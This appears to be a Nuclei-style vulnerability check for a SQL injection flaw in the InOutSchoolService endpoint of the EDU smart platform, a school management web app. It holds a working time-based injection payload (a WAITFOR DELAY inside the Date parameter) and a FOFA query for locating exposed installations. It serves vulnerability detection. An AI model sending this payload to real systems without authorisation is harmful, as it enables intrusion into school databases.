id: edu-zhpt-inoutschoolservice-sqli

info:
  name: EDU智慧平台InOutSchoolService存在SQL注入漏洞
  author: qwtd
  severity: high
  description: |
    EDU智慧平台InOutSchoolService存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
  reference:
    - https://github.com/wy876/POC/blob/main/EDU/EDU%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0PersonalDayInOutSchoolData%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="custom/blue/uimaker/easyui.css"
  tags: EDU智慧平台

http:
  - raw:
      - |
        @timeout 20s
        POST /ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&AccountNo=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Encoding: gzip, deflate
        Connection: keep-alive

    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'contains(body,"code\":\"200")'
          - 'contains(body,"msg\":\"成功")'
          - 'status_code == 200'
        condition: and

